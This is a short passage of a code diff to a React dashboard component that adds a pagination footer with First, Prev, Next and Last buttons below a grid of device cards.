                 <DeviceCard dev={d} delay={0} onClick={()=>setSelected({dev:d,account:{url:d.srcUrl,key:d.srcKey}})} pinned={pinnedIds.includes(d.id)} onTogglePin={togglePinDevice}/>
               </div>
             ))}
             {filtered.length===0&&<div style={{gridColumn:"1/-1",padding:"70px 20px",textAlign:"center",color:"var(--muted-2)",fontSize:12}}>No devices match filter</div>}
           </div>
+
+          {/* Pagination Footer */}
+          {totalPages > 1 && (
+              <div style={{display:"flex",justifyContent:"center",alignItems:"center",gap:10,marginTop:24}}>
+                  <button onClick={()=>setPage(1)} disabled={page===1} className="btn btn-ghost" style={{padding:"6px 12px",fontSize:11}}>First</button>
+                  <button onClick={()=>setPage(p=>Math.max(1,p-1))} disabled={page===1} className="btn btn-ghost" style={{padding:"6px 12px",fontSize:11}}>Prev</button>
+                  <span style={{fontSize:12,color:"var(--text)",fontWeight:600}}>Part {page} / {totalPages}</span>
+                  <button onClick={()=>setPage(p=>Math.min(totalPages,p+1))} disabled={page===totalPages} className="btn btn-ghost" style={{padding:"6px 12px",fontSize:11}}>Next</button>
+                  <button onClick={()=>setPage(totalPages)} disabled={page===totalPages} className="btn btn-ghost" style={{padding:"6px 12px",fontSize:11}}>Last</button>
+              </div>
+          )}
         </>}
     </main>
     <Toast msg={msg}/>
